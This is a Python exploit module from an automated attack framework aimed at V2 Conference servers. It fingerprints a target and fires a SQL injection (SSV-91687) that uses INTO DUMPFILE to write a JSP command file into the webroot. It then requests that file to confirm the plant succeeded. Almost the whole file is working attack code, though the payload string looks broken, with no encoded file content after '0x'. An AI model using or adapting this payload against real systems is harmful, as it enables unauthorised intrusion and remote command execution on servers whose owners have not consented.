# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-10 16:10

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import BugType, BugLevel
from core.request.asynchttp import *


# exploit.web.Meeting.v2Conference.sql_inject

class Script(BaseScript):
    name = 'V2-Conference'

    def __init__(self, target, session):
        super().__init__()
        # basic
        self.target = target
        self.bugLevel = BugLevel.HIGH
        self.bugType = BugType.SQLINJECTION
        self.bugNumber = 'SSV-91687'
        # 来源
        self.refer = 'https://www.seebug.org/vuldb/ssvid-91687'
        # session
        self.session = session
        # main
        self.detectList = ['/Conf/jsp/main/mainAction.do']
        self.payloadList = [
            '/Conf/jsp/systembulletin/bulletinAction.do?operator=modify&sysId=1%20UNION%20SELECT%201,2,3,4,0xinto%20dumpfile%20%27../../management/webapps/root/V2ConferenceCmd.jsp%27%23']
        self.execList = ['/V2ConferenceCmd.jsp']

    async def detect(self):
        try:
            for detectPath in self.detectList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'V2 Conference' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('v2Conference Finger', url))
                            return {'name': 'v2Conference Finger', 'url': url, 'software': 'v2Conference'}
        except Exception:
            return None

    async def exploit(self):
        try:
            for payload in self.payloadList:
                url = f'http://{self.target}{payload}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{payload}'
                await AsyncFetcher.fetch(session=self.session, url=url)
        except Exception:
            return None

    async def exec(self):
        try:
            for exec in self.execList:
                url = f'http://{self.target}{exec}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{exec}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'It works' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('v2Conference SQLInjection', url))
                            return {'name': 'v2Conference SQLInjection', 'url': url, 'software': 'v2Conference'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
                if self.flag:
                    await self.exploit()
                    c = await self.exec()
                    if c is not None:
                        self.vulList.append(c)
        pbar.update(1)
        return self.vulList
